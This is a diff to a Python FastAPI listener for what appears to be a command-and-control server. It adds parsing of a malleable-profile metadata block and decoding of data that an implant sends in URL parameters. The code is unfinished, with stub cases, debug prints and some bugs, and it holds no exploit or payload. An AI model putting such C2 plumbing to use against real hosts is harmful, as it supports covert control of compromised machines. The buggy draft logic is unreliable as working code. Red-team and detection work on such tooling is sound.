@@ -11,7 +11,7 @@ from fastapi.responses import JSONResponse
 from yarl import URL
 import uvicorn
 
-from ..malc2 import HttpServerEmitter
+from ..malc2 import HttpServerEmitter, HttpClientEmitter
 
 app = FastAPI
 mp = MalleableProfile
@@ -59,7 +59,7 @@ HTTP POST with CS is where task data is retrieved from the server.
 """
 
 
-async def http_get(request: Request, **kwargs):
+async def http_get(request: Request):
     """
     HTTP GET endpoint for the HTTP listener.
 
@@ -67,21 +67,94 @@ async def http_get(request: Request, **kwargs):
     - Accepts all URL parameters via **kwargs.
     - OpenAPI parameter documentation is not generated due to the **kwargs
     - This design enables a more flexible and malleable C2 interface.
+
+    !!Holy shit clean this all up
     """
-    print(request)
-    # maybe kwargs handling if needed (metadata, etc.)
-    print(kwargs)
 
     """
     Handle inputted data form fastapi
 
     """
-    # placehodler  script location
+    # all_params = dict(request.query_params)
+    # print(all_params)
+
+    # maybe validate those params.
+    # like if "incorrect params", then redirect to some other page.
+
+    # also, grab the parameter specified in metadata, and untransform it.
+    # hce = HttpClientEmitter(client_block=mp.http_get.client, data=all_params)
+    # plaintext = hce.apply_transforms()
+    # print(plaintext)
+
+    # based on specified paramter/etc, pull out the data based on malleable c2
+    # last item in metadata is where the data is stored.
+    # current options I can find: header, parameter. URI append and print may work here too
+
+    # 1. get last item in metadata
+    # terminator_type = "parameter"
+
+    TERMINATOR_TYPES = {"header", "parameter", "print", "uri-append"}
+
+    metadata_block = mp.http_get.client.metadata.data
+    print(metadata_block)
+
+    # note, figure out when key is used vs when value is used.
+    # causes  some weird code below/not delcaringkey unless a terminator?
+    for stmt in metadata_block:
+        print(stmt)
+        name = stmt.statement
+        # this uses key instead of value
+
+        # # If your block itself represents a statement:
+        if name in TERMINATOR_TYPES:
+            key = stmt.key
+
+            print("Terminator found:", name, key)
+            #! keyi instead of value here
+            terminator_type, terminator_key = name, key
+        else:
+            print("Not a terminator:", name)
+
+    match terminator_type:
+        case "header":
+            print("HEADER")
+            ...
+
+        case "parameter":
+            # get URLparameter
+            # ex, would  get value ofutmcc
+            data_from_request = request.query_params.get(terminator_key)
+            print(f"Data from request: {data_from_request}")
+
+            print("parameter")
+            hce = HttpClientEmitter(
+                client_block=mp.http_get.client, data=data_from_request
+            )
+            print(f"De-Obsfucated data: {hce.apply_transforms()}")
+
+            ...
+
+        case "uri-append":
+            print("uri_append")
+
+            ...
+
+        case "print":
+            print("print")
+            ...
+
+        case None:
+            ...
+
+        case _:
+            # unknown terminator
+            print("Unknown terminator: %r", terminator_type)
 
     """
     Setup a response for the implant
 
     """
+
     # pass in block to respective class
     emitter = HttpServerEmitter(mp.http_get.server)
 
